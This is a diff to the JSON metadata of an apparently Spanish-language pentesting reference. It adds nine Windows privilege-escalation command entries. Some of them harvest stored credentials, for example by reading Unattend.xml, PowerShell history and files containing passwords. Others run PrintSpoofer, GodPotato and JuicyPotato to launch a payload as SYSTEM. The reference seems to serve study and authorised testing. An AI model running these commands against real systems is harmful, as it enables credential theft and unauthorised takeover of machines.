@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 100
+    "totalCommandMetadata": 109
   },
   "tags": [
     "active-directory",
@@ -10306,6 +10306,214 @@
         "El flag no estaba en ambas ramas"
       ],
       "alternative": "msfvenom -f msi",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "wmic product get name,version 2>nul",
+      "objective": "Listar software de terceros instalado",
+      "tool": "wmic",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Programas instalados y su version.",
+      "successSignal": "Un producto con version vulnerable conocida (buscar CVE/exploit).",
+      "commonErrors": [
+        "wmic product tarda o esta deshabilitado"
+      ],
+      "alternative": "reg query de Uninstall",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "cmdkey /list",
+      "objective": "Ver credenciales guardadas en el almacen",
+      "tool": "cmdkey",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Credenciales cacheadas (usuarios/hosts) sin mostrar la clave.",
+      "successSignal": "Aparece una cred que puedes usar con runas /savecred.",
+      "commonErrors": [
+        "No hay credenciales guardadas"
+      ],
+      "alternative": "runas /savecred /user:... cmd",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "dir /s /b *pass* *cred* *config* *backup* 2>nul",
+      "objective": "Buscar ficheros con nombres sensibles",
+      "tool": "dir",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Rutas de ficheros que suenan a credenciales o config.",
+      "successSignal": "Un .config/.txt con credenciales en claro.",
+      "commonErrors": [
+        "Solo ruido: refina con findstr por contenido"
+      ],
+      "alternative": "findstr /si password",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "findstr /si password *.txt *.ini *.config *.xml 2>nul",
+      "objective": "Grepear contrasenas dentro de ficheros",
+      "tool": "findstr",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Lineas con 'password' en ficheros de texto.",
+      "successSignal": "Una contrasena en claro en un web.config, script o .ini.",
+      "commonErrors": [
+        "Muchos falsos positivos",
+        "Ficheros sin permiso de lectura"
+      ],
+      "alternative": "Select-String en PowerShell",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
+      "objective": "Leer credenciales de instalacion desatendida",
+      "tool": "type",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "El XML de despliegue, a veces con la clave del admin.",
+      "successSignal": "Un bloque <Password> (a menudo en base64) con la cred local.",
+      "commonErrors": [
+        "El fichero no existe o ya fue limpiado"
+      ],
+      "alternative": "sysprep.inf / autounattend.xml",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
+      "objective": "Leer el historial de comandos de PowerShell",
+      "tool": "type",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Comandos previos del usuario en esta consola.",
+      "successSignal": "Alguien tecleo una contrasena/token en la linea de comandos.",
+      "commonErrors": [
+        "Sin historial o vacio"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\"",
+      "objective": "Escalar a SYSTEM con PrintSpoofer (SeImpersonate)",
+      "tool": "printspoofer",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Tu token tiene SeImpersonatePrivilege (whoami /priv)"
+      ],
+      "expectedOutput": "Ejecuta tu payload como NT AUTHORITY\\SYSTEM.",
+      "successSignal": "La shell devuelta es SYSTEM.",
+      "commonErrors": [
+        "Sin SeImpersonate no aplica",
+        "Windows muy nuevo: usa GodPotato"
+      ],
+      "alternative": "GodPotato / JuicyPotato",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
+      "objective": "Escalar a SYSTEM con GodPotato (potato moderno)",
+      "tool": "godpotato",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "SeImpersonatePrivilege activo"
+      ],
+      "expectedOutput": "El comando corre como SYSTEM (funciona en Win10/11/2019+).",
+      "successSignal": "whoami devuelve nt authority\\system.",
+      "commonErrors": [
+        "Sin SeImpersonate",
+        ".NET requerido no presente"
+      ],
+      "alternative": "PrintSpoofer / JuicyPotatoNG",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t *",
+      "objective": "Escalar a SYSTEM con JuicyPotato (sistemas viejos)",
+      "tool": "juicypotato",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "SeImpersonate y Windows <= Server 2016/Win10 1809"
+      ],
+      "expectedOutput": "Lanza tu payload como SYSTEM abusando de un CLSID.",
+      "successSignal": "La shell es SYSTEM.",
+      "commonErrors": [
+        "No funciona en Windows nuevos (usa PrintSpoofer/GodPotato)",
+        "CLSID incorrecto para ese OS"
+      ],
+      "alternative": "PrintSpoofer / GodPotato",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
